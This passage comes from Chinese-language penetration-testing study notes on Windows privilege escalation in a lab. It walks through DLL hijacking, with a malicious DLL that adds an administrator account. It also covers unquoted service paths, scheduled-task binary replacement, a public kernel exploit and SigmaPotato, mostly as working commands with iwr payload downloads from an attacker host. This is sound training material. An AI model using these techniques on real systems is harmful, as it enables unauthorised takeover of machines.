ModifiablePath     IdentityReference                Permissions
--------------     -----------------                -----------
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal 

PS C:\Users\dave> $ModifiableFiles
```
> 這裡 `Get-ModifiablePath` 解析成了 C:\xampp\mysql\bin 而不是 mysqld.exe，導致 PowerUp 誤判。


### DLL Hijacking
若沒有權限來取代這些 Binary File ...\
Windows 上的 [Dynamic Link Libraries](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library)(DLL) 是一種提供特定功能的可共享程式碼庫，類似 Unix 的 [Shared Object](https://docs.oracle.com/cd/E19120-01/open.solaris/819-0690/6n33n7f8u/index.html) (.so)\
#### 1. 覆蓋二進位檔
但若不能覆蓋 `.exe`，可覆蓋 `.dll`。
#### 2. [DLL Search Order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) Hijacking 載入順序
Windows 會依照特定的順序搜尋 DLL，如果 attacker 在某個優先目錄中放入惡意 DLL，程式可能會先載入惡意 DLL\
Windows 預設開啟了 Safe DLL Search Mode，讓 DLL Hijacking 變得比較困難，但仍然可以找到可利用的漏洞。

>[!Tip]
>search order from [Microsoft Documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order):
>1. The directory from which the application loaded.
>2. The system directory.
>3. The 16-bit system directory.
>4. The Windows directory. 
>5. The current directory.
>6. The directories that are listed in the PATH environment variable.

以下範例使用 abuse missing DLL
```
PS C:\Users\steve> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

displayname
-----------

FileZilla 3.63.1
KeePass Password Safe 2.51.1
Microsoft Edge
Microsoft Edge Update
Microsoft Edge WebView2 Runtime

Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913
```
> `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"` 列出安裝在 Windows 系統上的 32-bit application (前面有講解過)
>> ileZilla FTP Client application: ver.3.63.1

查詢 [DLL hijacking vulnerability](https://filezilla-project.org/):\
當 application 啟動時，會嘗試從 installation directory 中 load `TextShaping.dll`，如果能夠成功將 malicious DLL 注入，當有 user 執行 FileZilla FTP Client， malicious DLL 就會被載入

##### 2.1 檢查 FileZilla directory 權限
檢查 FileZilla directory 可否寫入
```
PS C:\Users\steve> echo "chw" > 'C:\FileZilla\FileZilla FTP Client\chw.txt'
PS C:\Users\steve> type 'C:\FileZilla\FileZilla FTP Client\chw.txt'
chw
```
> 可寫入。

##### 2.2 Process Monitor 查看 real-time process
[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) 可以查看 real-time 的 process, thread, file system, or registry related activities.\
當找到 DLLs service binary，可以檢查權限，是否能用 malicious DLL 取代。

在本機安裝 [Procmon](https://concurrency.com/blog/procmon-basics/) (在正常 PT 中需要複製 service binary 到 local)

在 `C:\tools\Procmon\Procmon64.exe` 開啟，使用 backupadmin(Administrator group) 登入\
![image](https://hackmd.io/_uploads/SyGpanHc1e.png)

透過 Filter menu > Filter... 尋找 filezilla.exe 相關的資訊\
![image](https://hackmd.io/_uploads/HkATJTH51e.png)

CreateFile 除了負責 creating files 還會負責 accessing existing files.\
可以新增 Filter 條件:
- only CreateFile operations
- Path include TextShaping.dll

![image](https://hackmd.io/_uploads/Bkbe76S9kl.png)

![image](https://hackmd.io/_uploads/H1Kr7pS91x.png)
>在`C:\FileZilla\FileZilla FTP Client\` 載入 DLL，但失敗且NAME NOT FOUND，表示 DLL 根本不存在。隨後又進行了兩次CreateFile操作，其中 DLL 從 System32 加載成功

目標 :flashlight: ：建立一個名為 TextShaping.dll 的 malicious DLL

>[!Note]
>在 Windows 中，DLL 有一個 entry point function `DllMain`，function 包含四個 cases:
>- `DLL_PROCESS_ATTACH`: process 載入 DLL 時執行
>- `DLL_THREAD_ATTACH`: new thread 被創建時執行
>- `DLL_THREAD_DETACH`: thread 正常退出時執行
>- `DLL_PROCESS_DETACH`: DLL 被 unloaded 時執行
>
>如果 DLL 沒有 DllMain entry point function，它只提供資源。
>> `DLL_PROCESS_ATTACH` 會被執行，因此現在情況可在這個部分插入惡意程式碼

Microsoft 官方的基本 DllMain code example
```c
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

##### 2.3 Malicious code 撰寫與注入
加入 include statement 及 system function ，方法與上一節相同，加入 administrator user\
TextShaping.cpp:
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
編譯 TextShaping.cpp
```
┌──(chw㉿CHW)-[~]
└─$ sudo apt update
sudo apt install mingw-w64
...
┌──(chw㉿CHW)-[~]
└─$ vi TextShaping.cpp 
┌──(chw㉿CHW)-[~]
└─$ x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
┌──(chw㉿CHW)-[~]
└─$ python3 -m http.server 80                                         
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Windows 透過 iwr 接收 TextShaping.dll
```
PS C:\Users\steve> iwr -uri http://192.168.45.188/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

steve 是以 normal user 執行 FileZilla，則惡意 DLL 也只會以 normal user 權限運行，無法新增管理員帳戶。需要等待更高權限的 user 運行該應用程式並觸發惡意 DLL 的載入。

##### 2.4 驗證執行成果，獲得高權限 User 
```
PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave3                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave3
daveadmin
offsec
The command completed successfully.
```
> dave3 user 成功新增，代表 malicious code 成功執行

```
PS C:\Users\steve> runas /user:dave3 cmd
```

### Unquoted Service Paths
當主目錄或子目錄具有寫入權限但不能替換其中的檔案時，可以嘗試 [ unquoted service paths](https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability)，依據前面可以得知，每個 Windows service 都會對應到對應到一個 executable file。\
當服務啟用時，會使用到 Windows [CreateProcess function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
>[!Important]
>function 中的第一個parameter: `lpApplicationName` 用於指定執行檔的名稱和可選的路徑\
但如果這個路徑包含 **空格**，而且 **沒有引號（""）**，Windows 會從左到右解析，並在遇到第一個空格時，認為前面的部分可能是可執行檔，並嘗試加上 `.exe` 來執行。

以下舉例：
```
C:\Program Files\My Program\My Service\service.exe
```
根據以上路徑，Windows 解析順序如下：
1. C:\Program.exe
2. C:\Program Files\My.exe
3. C:\Program Files\My Program\My.exe
4. C:\Program Files\My Program\My service\service.exe

可以利用這項 feature，將 malicious executable ，放在對應的路徑。當服務啟動時，放入的 malicious executable 就會有與服務相同的權限，而權限通常會是 LocalSystem account，達到提權。\
依上方路徑而言，通常 normal user 不會有 `C:\Program Files` 與 `C:\Program Files\My Program\` 的寫入權限。在服務的主目錄可能性較大。

```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.171.220
```
先列舉正在運行和已停止的服務
```
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName 

Name                      State   PathName
----                      -----   --------
...
GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
...
```
> `Get-CimInstance`：取得 CIM（Common Information Model）Object，類似 `Get-WmiObject`\
> `-ClassName win32_service`：查詢 win32_service， Windows 內建的 WMI（Windows Management Instrumentation）類別，代表儲存系統中 **所有服務的資訊**\
>`State`: 可顯示服務 Running 或 Stopped
>> GammaService 已停止服務 且二進位路徑包含多個空格，因此可能容易受到此攻擊媒介的攻擊。


#### 1. 尋找 spaces 與 missing quotes 路徑
尋找 spaces 與 missing quotes 更有效率的方法: [WMI command-line](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) (WMIC)\
可使用 `service`, `get`, `name`, `pathname`， 輸出通過 `findstr`:
- `/i`: 不區分大小寫\
- `/v`: 僅打印不匹配的行

>[!Tip]
> 下方指令在 cmd.exe 而不是 PowerShell 中輸入此命令，以避免第二個findstr 命令中的引號出現轉義問題 。或者也可以在 PowerShell 使用 Select-String 。
```
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Name                                       PathName                                                                     
...                                                                                                         
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

#### 2. 檢查 user 有否服務重啟權限
使用 Start-Service 和 Stop-Service 啟動和停止
```
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```
> 成功執行，代表 Steve 有權限

GammaService 路徑分析:
1. C:\Program.exe
2. C:\Program Files\Enterprise.exe
3. C:\Program Files\Enterprise Apps\Current.exe
4. C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe

#### 3. 檢查 user 對於服務路徑的編輯權限
使用 icacls 檢查這些路徑中的存取權限
```
PS C:\Users\steve> icacls "C:\"
C:\ BUILTIN\Administrators:(OI)(CI)(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
    
Successfully processed 1 files; Failed processing 0 files
    
PS C:\Users\steve>icacls "C:\Program Files"
C:\Program Files NT SERVICE\TrustedInstaller:(F)
                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
                 CREATOR OWNER:(OI)(CI)(IO)(F)
...

Successfully processed 1 files; Failed processing 0 files
```
> steve 是 BUILTIN\Users 和 NT AUTHORITY\AUTHENTICATED Users 的 GroupMember，沒有寫入權限。

```
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W)
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```
> BUILTIN\Users:(OI)(CI)(RX,W)\
> 只能針對 `C:\Program Files\Enterprise Apps\` 下手

目標 :golf:： 將一個名為 `Current.exe` 的惡意檔案放入 `C:\Program Files\Enterprise Apps\` 中。

#### 4. 將 malicious executable 存入對應路徑
可以使用上方 [Service Binary Hijacking](#Service-Binary-Hijacking) 編譯好的 adduser.exe 
```
┌──(chw㉿CHW)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
PS C:\Users\steve> iwr -uri http://192.168.45.212/adduser.exe -Outfile Current.exe
PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```
> 複製到指令路徑後，重啟服務將會執行 `Current.exe` 而不是原始服務二進位檔 `GammaServ.exe`

#### 5. 重啟指定服務
```
PS C:\Users\steve> Start-Service GammaService
Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
service GammaService on computer '.'.
At line:1 char:1
+ Start-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
```
> 這個錯誤源自於 cross-compiled C code 不接受原始服務二進位路徑剩餘的參數\
> 🥚 `Current.exe` 仍會被成功執行
```
PS C:\Users\steve> net user

Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```
> user dave2 成功被新增
> 可用 Administrator (dave2) 登入

#### 6. [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) automated tool
一樣將 `ExecutionPolicy` 設定為 Bypass 並使用 `Get-UnquotedService`
```
PS C:\Users\steve> iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\steve> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\steve> . .\PowerUp.ps1

PS C:\Users\steve> Get-UnquotedService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService
...
```
> GammaService 被識別為存在漏洞

使用 AbuseFunction 並重新啟動服務\
將惡意程式 Current.exe 放置在 `C:\Program Files\Enterprise Apps\`
```
PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

ServiceName  Path                                         Command
-----------  ----                                         -------
GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...

PS C:\Users\steve> Restart-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...
Restart-Service : Failed to start service 'GammaService (GammaService)'.
At line:1 char:1
+ Restart-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
   , ServiceCommandException
    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand

PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    john            offsec
steve                    WDAGUtilityAccount

The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
john
...
```
> 透過使用 AbuseFunction, Write-ServiceBinary，使用者 john被建立為本地管理員

##  Abusing Other Windows Components
利用 Scheduled Tasks 和 exploits targeting 對 Windows 提權
### Scheduled Tasks
Windows 會利用 Scheduled Tasks 做各種自動化的任務，例如系統清理、更新管理或其他週期性工作。\
這些 Scheduled Tasks 會由 Trigger 所控制，當條件滿足時，就會執行動作，觸發條件包括特定時間點、開機、使用者登入、特定 event 發生時。\
**Question 1.** 若濫用 user task ，意義不大權限並沒有提升。需要嘗試 abuse NT AUTHORITY\SYSTEM 或 administrative 權限的 task\
**Question 2.** 注意 trigger 的狀態，若在過去已滿足條件，並不會讓 task 觸發\
**Question 3.** 如何執行潛在的提權

以下範例：
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.218.220
```

#### 1. 查看 scheduled tasks 
可以使用 [Get-ScheduledTask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2022-ps) 或 [schtasks /query](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-query) 查看 scheduled tasks
```
PS C:\Users\steve> schtasks /query /fo LIST /v
...
Folder: \Microsoft
HostName:                             CLIENTWK220
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        7/11/2022 2:47:21 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/11/2022 2:46:22 AM
Last Result:                          0
Author:                               CLIENTWK220\daveadmin
Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\steve\Pictures
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          daveadmin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           7:37:21 AM
Start Date:                           7/4/2022
...
```
> `/fo LIST`：指定輸出格式為 List
`/v`：顯示所有 Verbose
>> 列出大量的輸出，要從中找到符合上述 3 個 Question 的 task\

找到`\Microsoft\CacheCleanup` 由 daveadmin 創建\
條件: 在steve的 Pictures 主目錄中執行 BackendCacheCleanup.exe。且根據 Last Run Time 與 Next Run Time 可以猜測該任務每分鐘執行一次，執行身份以 daveadmin 運行。

#### 2. 查看指定 Task 權限
```
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                BUILTIN\Administrators:(I)(F)
                                                CLIENTWK220\steve:(I)(F)
                                                CLIENTWK220\offsec:(I)(F)
```
> 擁有所有存取權限（F）

#### 3. 利用 Malicious exe 將原始 Task 覆蓋
可以使用上方 [Service Binary Hijacking](#Service-Binary-Hijacking) 編譯好的 adduser.exe 
```
┌──(chw㉿CHW)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
PS C:\Users\steve> iwr -Uri http://192.168.45.212/adduser.exe -Outfile BackendCacheCleanup.exe
PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
```
> 成功利用 Malicious exe 覆蓋 BackendCacheCleanup.exe

#### 4. 驗證提權結果
```
PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```
> 新增 user dave2 ，代表 Malicious exe 成功執行

### Using Exploits
兩種不同類型的提權漏洞:
- application-based vulnerabilities
在 [Locating Public Exploits](https://hackmd.io/@CHW/ryj8tW4UJl#Locating-Public-Exploits) 中提到的，Windows 系統上安裝的應用程式可能包含不同類型的漏洞，透過執行 administrative permissions 的應用程式漏洞。
- Windows Kernel
[Windows Kernel](https://en.wikipedia.org/wiki/Architecture_of_Windows_NT) 需要對 Windows 作業系統有深入了解

#### 1. 查看使用者權限
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.175.220
```
```
PS C:\Users\steve> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```
> 沒有任何特殊權限

#### 2. 查看系統版本 與 patches installed 
```
PS C:\Users\steve> systeminfo

Host Name:                 CLIENTWK220
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22621 N/A Build 22621
...
PS C:\Users\steve> Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }

Source        Description      HotFixID      InstalledBy          InstalledOn
------        -----------      --------      -----------          -----------
              Security Update  KB5025239                          5/4/2023 12:00:00 AM
              Security Update  KB5025749                          5/4/2023 12:00:00 AM
              Security Update  KB5017233                          9/25/2022 12:00:00 AM
```
>`Get-CimInstance -Class`: 使用 CIM（Common Information Model） 取得資訊\
>`win32_quickfixengineering`: Windows WMI（Windows Management Instrumentation）顯示已安裝的系統更新的 Hotfix\
>`| Where-Object { $_.Description -eq "Security Update" }`: 只顯示 Description 為 "Security Update" 的目標。
>> Windows 22H2 版本上沒有太多安全性更新

可以查看 [Microsoft Security Response Center](https://msrc.microsoft.com/) 的 Security vulnerabilities\
其中 [CVE-2023-29360](https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release) 提供了 exploit code 和  pre-compiled version exploit 。在漏洞的官方網站 MSRC，[微軟應該會根據漏洞提供 patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360)，patch 編號為 KB5027215，但我們在目標機器上沒有看到 (代表未修補)。

#### 3. 嘗試使用 public exploit
```
PS C:\Users\steve\Desktop> whoami
clientwk220\steve
PS C:\Users\steve\Desktop> .\CVE-2023-29360.exe
[+] Device Description: Microsoft Streaming Service Proxy
Hardware IDs:
        "SW\{96E080C7-143C-11D1-B40F-00A0C9223196}"
[+] Device Instance ID: SW\{96E080C7-143C-11D1-B40F-00A0C9223196}\{3C0D501A-140B-11D1-B40F-00A0C9223196}
[+] First mapped _MDL: 25f9aa00140
[+] Second mapped _MDL: 25f9aa10040
[+] Unprivileged token reference: ffffd1072dde6061
[+] System token reference: ffffd1071de317d5
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\steve\Desktop>whoami
nt authority\system
```
> public exploit 成功提權，以上是利用 Kernel Exploit 的方式

>[!Important]
>**濫用 Windows 特權（Privilege Abuse**）\
>Windows 作業系統中的某些 Privileges 允許特定使用者執行敏感操作，例如：
`SeImpersonatePrivilege`（冒充權限）\
`SeBackupPrivilege`（備份權限）\
`SeDebugPrivilege`（除錯權限）\
若 whoami /priv 顯示 SeImpersonatePrivilege，表示 attacker 可以利用它來提權。

>[!Important]
>**Named Pipe 進行提權**\
>建立惡意 Named Pipe、誘導高權限服務連線、冒充 SYSTEM\
>工具：[SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
>> 專門利用 `SeImpersonatePrivilege` 來進行權限提升。\
透過 Named Pipe 來誘導 NT AUTHORITY\SYSTEM 連線，最終讓攻擊者執行高權限命令或獲取 SYSTEM shell。

### SigmaPotato
以下範例利用 SigmaPotato 提權
#### 1. 查看使用者權限
```
┌──(chw㉿CHW)-[~]
└─$ nc 192.168.175.220 4444
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```
> dave 擁有 `SeImpersonatePrivilege` 權限

#### 2. 嘗試使用 PrintSpoofer 提權
```
┌──(chw㉿CHW)-[~/Tools/SigmaPotato]
└─$ wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
┌──(chw㉿CHW)-[~/Tools/SigmaPotato]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
C:\Users\dave>powershell
powershell
Windows PowerShell

PS C:\Users\dave> iwr -uri http://192.168.45.227/SigmaPotato.exe -OutFile SigmaPotato.exe
iwr -uri http://192.168.45.227/SigmaPotato.exe -OutFile SigmaPotato.exe
```
#### 3. 執行 SigmaPotato
利用 SigmaPotato 提權，並新增一個 Administrator: dave4
```
PS C:\Users\dave> .\SigmaPotato "net user dave4 lab /add"
.\SigmaPotato "net user dave4 lab /add"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
...
[+] Process Started with PID: 2004

[+] Process Output:
The command completed successfully.

PS C:\Users\dave> net user
net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave                     
dave4                    daveadmin                DefaultAccount           
Guest                    offsec                   steve                    
WDAGUtilityAccount       
The command completed successfully.

PS C:\Users\dave> .\SigmaPotato "net localgroup Administrators dave4 /add"
.\SigmaPotato "net localgroup Administrators dave4 /add"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
...
[+] Process Started with PID: 10872

[+] Process Output:
The command completed successfully.


PS C:\Users\dave> net localgroup Administrators
net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave4
daveadmin
offsec
The command completed successfully.
```
>`.\SigmaPotato "net user dave4 lab /add"`:\
> `dave4` 建立新帳戶名稱, `lab` 帳戶密碼, `/add` 代表新增該帳戶\
> `.\SigmaPotato "net localgroup Administrators dave4 /add"`:\
> `Administrators` 本機管理員群組, `dave4` 加入管理員群組的帳戶, `/add` 表示將 dave4 加入 Administrators Group。
>> 成功提權


# Linux Privilege Escalation
如何 enumerate Linux machines 與 Linux privileges 的結構
## Enumerating Linux
manual and automated enumeration techniques
### Understanding Files and Users Privileges on Linux
每個檔案都遵循三個主要屬性的 user 和 group 權限：\
讀取（r）、寫入（w）和 執行（x）\
```
┌──(chw㉿CHW)-[~]
└─$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1386 Feb  3 04:21 /etc/shadow
```
### Manual Enumeration
#### - id
使用 `id` 收集使用者資訊
```
┌──(chw㉿CHW)-[~]
└─$ ssh joe@192.168.223.214 
...
joe@192.168.223.214's password: 
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Feb 15 04:15:11 2023 from 192.168.118.3
joe@debian-privesc:~$ id
uid=1000(joe) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```
#### - /etc/passwd
enumerate all users: /etc/passwd
```
joe@debian-privesc:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
...
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
